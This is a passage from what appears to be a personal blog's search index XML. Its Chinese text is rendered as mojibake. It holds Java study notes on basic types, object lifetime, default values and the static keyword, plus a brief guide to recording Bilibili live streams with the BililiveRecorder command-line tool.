        <content type="html"><![CDATA[<h2 id="2-2-åŸºæœ¬æ•°æ®ç±»å‹"><a href="#2-2-åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="2.2 åŸºæœ¬æ•°æ®ç±»å‹"></a>2.2 åŸºæœ¬æ•°æ®ç±»å‹</h2><p><strong>stringä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ã€‚</strong><img src="https://img13.360buyimg.com/ddimg/jfs/t1/195661/8/8079/206780/60c755f6E54758dcd/ffdb69980ac7b6c1.jpg"></p><h3 id="2-2-2-é«˜ç²¾åº¦æ•°å­—"><a href="#2-2-2-é«˜ç²¾åº¦æ•°å­—" class="headerlink" title="2.2.2 é«˜ç²¾åº¦æ•°å­—"></a>2.2.2 é«˜ç²¾åº¦æ•°å­—</h3><ul><li><strong>é«˜ç²¾åº¦æ•°å­—ï¼šBigIntegerã€BigDecimal</strong><ul><li><strong>BigIntegerï¼šæ”¯æŒä»»æ„ç²¾åº¦çš„æ•´æ•°ã€‚</strong></li><li><strong>BigDecimalï¼šæ”¯æŒä»»æ„ç²¾åº¦çš„å®šç‚¹æ•°ã€‚</strong></li></ul></li></ul><h3 id="2-2-3-åˆ›å»ºæ•°ç»„å¯¹è±¡å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼•ç”¨æ•°ç»„ã€‚"><a href="#2-2-3-åˆ›å»ºæ•°ç»„å¯¹è±¡å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼•ç”¨æ•°ç»„ã€‚" class="headerlink" title="2.2.3 åˆ›å»ºæ•°ç»„å¯¹è±¡å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼•ç”¨æ•°ç»„ã€‚"></a>2.2.3 åˆ›å»ºæ•°ç»„å¯¹è±¡å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼•ç”¨æ•°ç»„ã€‚</h3><h2 id="2-3-ç”Ÿå‘½å‘¨æœŸ"><a href="#2-3-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="2.3 ç”Ÿå‘½å‘¨æœŸ"></a>2.3 ç”Ÿå‘½å‘¨æœŸ</h2><p><strong>javaå¯¹è±¡ç”Ÿå‘½å‘¨æœŸå’ŒåŸºæœ¬ç±»å‹ä¸ä¸€æ ·ã€‚ç”¨newåˆ›å»ºçš„å¯¹è±¡å¯ä»¥å­˜æ´»äºä½œç”¨åŸŸä¹‹å¤–ã€‚</strong><br><strong>javaåƒåœ¾å›æ”¶å™¨ä¼šç›‘è§†newçš„å¯¹è±¡ï¼Œè¾¨åˆ«ä¸ä¼šå†è¢«å¼•ç”¨çš„å¯¹è±¡å¹¶é‡Šæ”¾å†…å­˜ç©ºé—´ã€‚</strong></p><h2 id="2-4-åˆå§‹å€¼"><a href="#2-4-åˆå§‹å€¼" class="headerlink" title="2.4 åˆå§‹å€¼"></a>2.4 åˆå§‹å€¼</h2><p><strong>å˜é‡ä½œä¸ºç±»çš„æˆå‘˜æˆ–å…¨å±€å˜é‡ä¼šæœ‰åˆå§‹é»˜è®¤å€¼ï¼Œå±€éƒ¨å˜é‡æ²¡æœ‰åˆå§‹å€¼ã€‚</strong><br><strong><img src="https://img10.360buyimg.com/ddimg/jfs/t1/182601/20/9214/90450/60c756c2E31138148/e3d464be6e09303d.jpg"></strong></p><h2 id="2-5-javaå‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ï¼Œc-c-ä¸èƒ½"><a href="#2-5-javaå‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ï¼Œc-c-ä¸èƒ½" class="headerlink" title="2.5 javaå‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ï¼Œc/c++ä¸èƒ½"></a>2.5 javaå‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ï¼Œc/c++ä¸èƒ½</h2><h2 id="2-6-javaåº“å‡½æ•°-java-util"><a href="#2-6-javaåº“å‡½æ•°-java-util" class="headerlink" title="2.6 javaåº“å‡½æ•° java.util.*"></a>2.6 javaåº“å‡½æ•° <code>java.util.*</code></h2><h3 id="2-6-3-static-å…³é”®å­—"><a href="#2-6-3-static-å…³é”®å­—" class="headerlink" title="2.6.3 static å…³é”®å­—"></a>2.6.3 static å…³é”®å­—</h3><ul><li><strong>staticé€‚ç”¨äºä¸¤ç§æƒ…å†µ</strong><ul><li><strong>åˆ†é…å•ä¸€å­˜å‚¨ç©ºé—´ï¼Œä¸è€ƒè™‘åˆ›å»ºå¤šå°‘å¯¹è±¡æˆ–è€…ä¸åˆ›å»ºå¯¹è±¡ã€‚</strong></li><li><strong>åˆ›å»ºçš„æ–¹æ³•ä¸ä¸åŒ…å«å®ƒçš„ç±»çš„å¯¹è±¡å…³è”èµ·æ¥</strong></li></ul></li><li><strong>åˆ›å»ºstaticäº‹ç‰©åï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºå¯¹è±¡ä¹Ÿå¯ä»¥è°ƒç”¨staticæ–¹æ³•æˆ–staticåŸŸã€‚</strong></li></ul><p><strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185967/29/9177/76016/60c756eeE4ec4eae5/e3b719fb7e5add2e.jpg"></strong></p><ul><li><strong>staticå˜é‡æˆ–staticæ–¹æ³•å¯ä»¥é€šè¿‡ç±»åç›´æ¥å¼•ç”¨ï¼Œè€Œä¸”æ˜¯é¦–é€‰æ–¹å¼</strong>Â <strong>ã€‚</strong></li><li><strong>staticæ–¹æ³•å†…éƒ¨ä¸èƒ½è°ƒç”¨éstaticæ–¹æ³•ï¼Œéstaticæ–¹æ³•å¯ä»¥è°ƒç”¨staticæ–¹æ³•</strong> ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bilibiliç›´æ’­å§¬å‘½ä»¤è¡Œç‰ˆä½¿ç”¨æŒ‡å—</title>
      <link href="/2020/06/13/Bilibili%E5%BD%95%E6%92%AD%E5%A7%AC%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97_/"/>
      <url>/2020/06/13/Bilibili%E5%BD%95%E6%92%AD%E5%A7%AC%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97_/</url>
      
        <content type="html"><![CDATA[<p><a name="R2n7M"></a></p><h1 id="ä¸‹è½½ä¸å®‰è£…"><a href="#ä¸‹è½½ä¸å®‰è£…" class="headerlink" title="ä¸‹è½½ä¸å®‰è£…"></a>ä¸‹è½½ä¸å®‰è£…</h1><p><a href="https://rec.danmuji.org/docs/cli/">https://rec.danmuji.org/docs/cli/</a><br />é€‰æ‹©å¯¹åº”çš„ç‰ˆæœ¬åè§£å‹ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œcdåˆ°è§£å‹åçš„æ–‡ä»¶å¤¹<br><a name="wIaeO"></a></p><h1 id="å½•åˆ¶"><a href="#å½•åˆ¶" class="headerlink" title="å½•åˆ¶"></a>å½•åˆ¶</h1><p>ç›´æ¥è¾“å…¥./BililiveRecorder.Cli portable â€œå­˜å‚¨è§†é¢‘çš„è·¯å¾„â€ æˆ¿é—´å·<br />å³å¯å¼€å§‹å½•åˆ¶<br><a name="hHfLa"></a></p><h1 id="æ¥ï¼Œè¯•è¯•çœ‹ï¼"><a href="#æ¥ï¼Œè¯•è¯•çœ‹ï¼" class="headerlink" title="æ¥ï¼Œè¯•è¯•çœ‹ï¼"></a>æ¥ï¼Œè¯•è¯•çœ‹ï¼</h1>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
